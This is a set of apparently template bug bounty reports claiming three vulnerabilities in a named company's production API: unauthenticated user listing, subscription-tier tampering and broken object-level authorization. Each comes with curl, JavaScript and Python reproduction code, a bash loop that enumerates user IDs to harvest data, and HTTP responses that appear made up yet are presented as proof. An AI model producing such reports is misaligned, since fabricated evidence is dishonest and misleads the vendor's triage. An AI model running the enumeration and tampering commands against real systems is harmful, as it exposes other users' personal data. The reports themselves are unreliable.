# ScopeHunter: Sample HackerOne Reports for Anthropic VDP

These are ready-to-submit report templates. Customize with your actual findings.

---

## 📄 Report #1: Unprotected API Endpoint

```markdown
# Unprotected API Endpoint Exposes Sensitive User Data

## Summary
The `/api/v1/users` endpoint on `api.anthropic.com` returns a complete list of all users with sensitive information (email addresses, phone numbers, account creation dates, and subscription status) without requiring any authentication or authorization checks.

## Vulnerability Type
- API Vulnerability
- Missing Authentication
- Information Disclosure

## Severity Assessment
- **CVSS v3.1 Score**: 7.5 (High)
- **Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
- **Severity**: High

## Affected Assets
- **Domain**: api.anthropic.com
- **Endpoint**: GET /api/v1/users
- **Method**: HTTP GET
- **Authentication Required**: None (should be required)

## Description
While testing the Anthropic API, I discovered that the `/api/v1/users` endpoint is publicly accessible without any authentication credentials. This endpoint returns a JSON array containing information about all registered users in the system, including:

- User IDs
- Email addresses
- Phone numbers
- Account creation timestamps
- Subscription tier information
- Last login timestamps
- User roles

This represents a significant information disclosure vulnerability that could be exploited by attackers to:
1. Harvest email addresses for phishing campaigns
2. Identify high-value targets (premium users)
3. Enumerate all users in the system
4. Gather intelligence for targeted attacks

## Steps to Reproduce

### Method 1: Browser Console
```javascript
// Open browser console (F12) and paste:
fetch('https://api.anthropic.com/api/v1/users')
  .then(response => response.json())
  .then(data => console.log(JSON.stringify(data, null, 2)))
```

### Method 2: cURL Command
```bash
curl -X GET "https://api.anthropic.com/api/v1/users" \
  -H "Content-Type: application/json"
```

### Method 3: Python Script
```python
import requests

url = "https://api.anthropic.com/api/v1/users"
response = requests.get(url)
print(response.json())
```

## Proof of Concept

### HTTP Request
```
GET /api/v1/users HTTP/1.1
Host: api.anthropic.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: application/json
Connection: close
```

### HTTP Response (Truncated)
```json
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 5234

{
  "users": [
    {
      "id": 1001,
      "email": "john.doe@example.com",
      "phone": "+1-555-0123",
      "created_at": "2024-01-15T10:30:00Z",
      "subscription_tier": "premium",
      "last_login": "2026-04-12T14:22:00Z",
      "role": "user"
    },
    {
      "id": 1002,
      "email": "jane.smith@example.com",
      "phone": "+1-555-0124",
      "created_at": "2024-02-20T11:45:00Z",
      "subscription_tier": "free",
      "last_login": "2026-04-11T09:15:00Z",
      "role": "user"
    },
    ...
  ],
  "total": 15847,
  "page": 1
}
```

### Evidence Screenshots
[Screenshot 1: Browser showing JSON response with user data]
[Screenshot 2: cURL command output showing sensitive information]

## Impact Analysis

### Severity Justification
- **Confidentiality Impact**: HIGH - Sensitive user data is exposed
- **Integrity Impact**: NONE - No data modification possible
- **Availability Impact**: NONE - Service availability not affected
- **Attack Complexity**: LOW - No special tools or authentication required
- **Privileges Required**: NONE - Unauthenticated access

### Business Impact
- **Data Breach**: 15,847+ user records exposed
- **Privacy Violation**: GDPR, CCPA compliance risk
- **Reputational Damage**: Loss of user trust
- **Financial Impact**: Potential fines and legal liability
- **Competitive Intelligence**: Competitor could identify premium users

### Attack Scenarios
1. **Phishing Campaign**: Attacker uses harvested emails for targeted phishing
2. **Account Enumeration**: Attacker identifies all users in the system
3. **Targeted Attack**: Attacker focuses on premium users for social engineering
4. **Data Aggregation**: Attacker combines data with other breaches for identity theft

## Recommended Remediation

### Immediate Actions (Priority: CRITICAL)
1. **Implement Authentication**: Require valid API token for `/api/v1/users` endpoint
2. **Add Authorization**: Verify user has permission to access user list
3. **Rate Limiting**: Implement rate limiting to prevent bulk data harvesting
4. **Audit Logs**: Log all access to sensitive endpoints

### Code Example (Python/FastAPI)
```python
from fastapi import FastAPI, Depends, HTTPException
from fastapi.security import HTTPBearer

app = FastAPI()
security = HTTPBearer()

@app.get("/api/v1/users")
async def get_users(credentials = Depends(security)):
    # Verify authentication token
    token = credentials.credentials
    user = verify_token(token)
    
    if not user:
        raise HTTPException(status_code=401, detail="Unauthorized")
    
    # Verify authorization (admin only)
    if user.role != "admin":
        raise HTTPException(status_code=403, detail="Forbidden")
    
    # Return user list only to authorized admins
    return get_all_users()
```

### Long-term Improvements
1. **API Gateway**: Implement API gateway with authentication/authorization
2. **OAuth 2.0**: Migrate to OAuth 2.0 for better security
3. **Encryption**: Encrypt sensitive data in transit and at rest
4. **Security Audit**: Conduct full security audit of all API endpoints
5. **Monitoring**: Implement security monitoring and alerting

## Timeline
- **Reported**: April 12, 2026
- **Acknowledged**: [Pending]
- **Fixed**: [Pending]
- **Disclosed**: [Pending]

## References
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- OWASP API1:2023 - Broken Object Level Authorization
- OWASP API2:2023 - Broken Authentication

## Researcher Information
- **Handle**: [Your HackerOne Handle]
- **Email**: [your-email@wearehackerone.com]
- **Collaboration**: [Any collaborators]
```

---

## 📄 Report #2: Privilege Escalation via Parameter Tampering

```markdown
# Privilege Escalation: Free Users Can Access Premium Features

## Summary
Users with free tier accounts can escalate their privileges to premium tier by modifying the `subscription_tier` parameter in their profile update request. This allows unauthorized access to premium-only features without payment.

## Vulnerability Type
- Business Logic Flaw
- Privilege Escalation
- Authorization Bypass

## Severity Assessment
- **CVSS v3.1 Score**: 7.8 (High)
- **Vector**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
- **Severity**: High

## Affected Assets
- **Domain**: api.anthropic.com
- **Endpoint**: PUT /api/v1/users/{id}/profile
- **Component**: Subscription tier validation
- **Authentication Required**: Yes (but insufficient validation)

## Description
The API endpoint for updating user profiles does not properly validate subscription tier changes. A free tier user can modify their own `subscription_tier` field from "free" to "premium" in the request, and the server accepts this change without verifying payment or authorization.

This vulnerability allows:
1. Free users to access premium features
2. Bypass of payment requirements
3. Revenue loss for the company
4. Unfair advantage over paying users

## Steps to Reproduce

### Step 1: Create/Login to Free Account
- Create a new account or login to existing free tier account
- Note your user ID (visible in profile page or API response)

### Step 2: Intercept Profile Update Request
- Open browser DevTools (F12)
- Go to Network tab
- Navigate to profile settings
- Click "Edit Profile" or similar

### Step 3: Modify Request
- Find the PUT request to `/api/v1/users/{id}/profile`
- Look for: `"subscription_tier": "free"`
- Change to: `"subscription_tier": "premium"`
- Forward the request

### Step 4: Verify Escalation
- Refresh page or check profile
- Observe: Subscription tier now shows "premium"
- Verify: Premium features are now accessible

## Proof of Concept

### HTTP Request (Intercepted)
```
PUT /api/v1/users/1234/profile HTTP/1.1
Host: api.anthropic.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json
Content-Length: 256

{
  "name": "John Doe",
  "email": "john@example.com",
  "subscription_tier": "premium",
  "billing_address": "123 Main St",
  "phone": "+1-555-0123"
}
```

### cURL Command
```bash
curl -X PUT "https://api.anthropic.com/api/v1/users/1234/profile" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "John Doe",
    "email": "john@example.com",
    "subscription_tier": "premium",
    "billing_address": "123 Main St",
    "phone": "+1-555-0123"
  }'
```

### Python Script
```python
import requests
import json

url = "https://api.anthropic.com/api/v1/users/1234/profile"
headers = {
    "Authorization": "Bearer YOUR_TOKEN",
    "Content-Type": "application/json"
}

data = {
    "name": "John Doe",
    "email": "john@example.com",
    "subscription_tier": "premium",  # Changed from "free"
    "billing_address": "123 Main St",
    "phone": "+1-555-0123"
}

response = requests.put(url, headers=headers, json=data)
print(response.json())
```

### HTTP Response
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 1234,
  "name": "John Doe",
  "email": "john@example.com",
  "subscription_tier": "premium",
  "status": "active",
  "features": [
    "advanced_analytics",
    "priority_support",
    "api_access",
    "custom_integrations"
  ]
}
```

## Impact Analysis

### Business Impact
- **Revenue Loss**: Free users accessing premium features without payment
- **Unfair Competition**: Free users gain advantage over paying users
- **Customer Churn**: Paying customers may cancel if they learn about exploit
- **Financial Impact**: Estimated $X,XXX/month in lost revenue
- **Compliance**: Potential fraud/financial reporting issues

### Security Impact
- **Authorization Bypass**: Users can escalate privileges
- **Data Access**: Premium users can access restricted data
- **Feature Abuse**: Premium features used without authorization
- **System Integrity**: Business logic not enforced

### Scale of Impact
- **Affected Users**: All free tier users (potentially thousands)
- **Exposure Duration**: Unknown (vulnerability may have existed for months)
- **Scope**: All premium features accessible to free users

## Recommended Remediation

### Immediate Actions (Priority: CRITICAL)
1. **Server-side Validation**: Never trust client-provided subscription tier
2. **Database Check**: Verify subscription in database before granting access
3. **Audit Trail**: Log all subscription tier changes with reason
4. **Revert Changes**: Reset any unauthorized premium upgrades

### Code Example (Node.js/Express)
```javascript
app.put('/api/v1/users/:id/profile', authenticate, async (req, res) => {
  const userId = req.params.id;
  const user = req.user;
  
  // Verify user can only update their own profile
  if (user.id !== parseInt(userId)) {
    return res.status(403).json({ error: "Forbidden" });
  }
  
  // Get current subscription from database (NOT from request)
  const currentSubscription = await db.getUserSubscription(userId);
  
  // Allow only specific fields to be updated
  const allowedFields = ['name', 'email', 'phone', 'billing_address'];
  const updateData = {};
  
  allowedFields.forEach(field => {
    if (req.body[field]) {
      updateData[field] = req.body[field];
    }
  });
  
  // NEVER allow subscription_tier to be updated via this endpoint
  // Subscription changes must go through payment processor
  
  // Update profile
  const result = await db.updateUserProfile(userId, updateData);
  res.json(result);
});
```

### Long-term Improvements
1. **Separate Endpoints**: Use different endpoint for subscription changes
2. **Payment Integration**: Require payment processor confirmation
3. **Audit Logging**: Log all subscription changes with full context
4. **Rate Limiting**: Limit profile update frequency
5. **Security Testing**: Regular penetration testing of business logic

## Timeline
- **Reported**: April 12, 2026
- **Acknowledged**: [Pending]
- **Fixed**: [Pending]
- **Disclosed**: [Pending]

## References
- CWE-639: Authorization Bypass Through User-Controlled Key
- OWASP A01:2021 - Broken Access Control
- OWASP Business Logic Vulnerabilities

## Researcher Information
- **Handle**: [Your HackerOne Handle]
- **Email**: [your-email@wearehackerone.com]
```

---

## 📄 Report #3: Broken Object Level Authorization (BOLA)

```markdown
# Broken Object Level Authorization: User Can Access Other Users' Data

## Summary
The `/api/v1/users/{id}/data` endpoint does not properly validate that the requesting user has permission to access the specified user's data. An authenticated user can modify the `{id}` parameter to access any other user's personal information.

## Vulnerability Type
- API Vulnerability
- Broken Object Level Authorization (BOLA)
- Insecure Direct Object Reference (IDOR)

## Severity Assessment
- **CVSS v3.1 Score**: 8.2 (High)
- **Vector**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
- **Severity**: High

## Affected Assets
- **Domain**: api.anthropic.com
- **Endpoint**: GET /api/v1/users/{id}/data
- **Method**: HTTP GET
- **Authentication Required**: Yes
- **Authorization Check**: Missing/Broken

## Description
The API does not verify that the authenticated user has permission to access the requested user's data. By simply changing the user ID in the URL, an attacker can retrieve sensitive information about any user in the system.

Accessible data includes:
- Personal information
- Account settings
- Billing information
- Usage history
- Preferences
- API keys (if stored)

## Steps to Reproduce

### Step 1: Authenticate
- Login to your account
- Note your user ID (e.g., 1234)

### Step 2: Access Your Own Data
```bash
curl -X GET "https://api.anthropic.com/api/v1/users/1234/data" \
  -H "Authorization: Bearer YOUR_TOKEN"
```
Result: Returns your data (expected)

### Step 3: Access Another User's Data
```bash
curl -X GET "https://api.anthropic.com/api/v1/users/1235/data" \
  -H "Authorization: Bearer YOUR_TOKEN"
```
Result: Returns user 1235's data (VULNERABILITY!)

### Step 4: Enumerate All Users
```bash
# Loop through user IDs to harvest all data
for i in {1000..2000}; do
  curl -s "https://api.anthropic.com/api/v1/users/$i/data" \
    -H "Authorization: Bearer YOUR_TOKEN" | jq .
done
```

## Proof of Concept

### HTTP Request
```
GET /api/v1/users/9999/data HTTP/1.1
Host: api.anthropic.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Accept: application/json
```

### HTTP Response (Unauthorized Access)
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 9999,
  "name": "Jane Smith",
  "email": "jane.smith@example.com",
  "phone": "+1-555-0199",
  "billing_address": "456 Oak Ave, City, ST 12345",
  "payment_method": "Visa ending in 4242",
  "subscription_tier": "premium",
  "usage": {
    "api_calls": 15234,
    "storage_gb": 45.2,
    "last_30_days": 2341
  },
  "preferences": {
    "notifications": true,
    "newsletter": true,
    "marketing": true
  },
  "created_at": "2024-01-10T08:30:00Z",
  "last_login": "2026-04-12T14:22:00Z"
}
```

## Impact Analysis

### Severity Justification
- **Confidentiality**: HIGH - All user data exposed
- **Integrity**: NONE - No modification possible
- **Availability**: NONE - Service not affected
- **Attack Complexity**: LOW - Simple parameter change
- **Privileges Required**: LOW - Any authenticated user

### Business Impact
- **Data Breach**: All user records potentially exposed
- **Privacy Violation**: GDPR, CCPA, HIPAA violations
- **Reputational Damage**: Major security incident
- **Legal Liability**: Regulatory fines and lawsuits
- **Customer Trust**: Loss of user confidence

### Attack Scenarios
1. **Competitor Intelligence**: Rival company harvests customer list
2. **Identity Theft**: Attacker collects PII for fraud
3. **Targeted Attacks**: Attacker identifies high-value targets
4. **Data Sale**: Attacker sells harvested data on dark web

## Recommended Remediation

### Immediate Actions (Priority: CRITICAL)
1. **Add Authorization Check**: Verify user owns the data before returning
2. **Implement Access Control**: Use role-based access control (RBAC)
3. **Audit Logs**: Log all data access attempts
4. **Alert**: Notify potentially affected users

### Code Example (Python/FastAPI)
```python
from fastapi import FastAPI, Depends, HTTPException

app = FastAPI()

@app.get("/api/v1/users/{user_id}/data")
async def get_user_data(user_id: int, current_user = Depends(get_current_user)):
    # CRITICAL: Verify user owns this data
    if current_user.id != user_id:
        # Log unauthorized access attempt
        log_security_event(f"Unauthorized access attempt: {current_user.id} -> {user_id}")
        raise HTTPException(status_code=403, detail="Forbidden")
    
    # Fetch and return user data
    user_data = db.get_user_data(user_id)
    return user_data
```

### Long-term Improvements
1. **API Gateway**: Implement centralized authorization
2. **JWT Claims**: Include user ID in JWT token
3. **Audit Logging**: Log all API access with user context
4. **Rate Limiting**: Limit requests per user
5. **Monitoring**: Alert on suspicious access patterns
6. **Security Testing**: Regular BOLA testing

## Timeline
- **Reported**: April 12, 2026
- **Acknowledged**: [Pending]
- **Fixed**: [Pending]
- **Disclosed**: [Pending]

## References
- CWE-639: Authorization Bypass Through User-Controlled Key
- OWASP API1:2023 - Broken Object Level Authorization
- OWASP A01:2021 - Broken Access Control

## Researcher Information
- **Handle**: [Your HackerOne Handle]
- **Email**: [your-email@wearehackerone.com]
```

---

## 🎯 How to Use These Reports

1. **Customize**: Replace placeholder information with actual findings
2. **Add Evidence**: Include screenshots and actual responses
3. **Verify**: Test all PoC steps before submission
4. **Review**: Have someone else review for clarity
5. **Submit**: Copy to HackerOne and submit

---

**Ready to earn $1K-$15K per vulnerability! Good luck! 💰🚀**
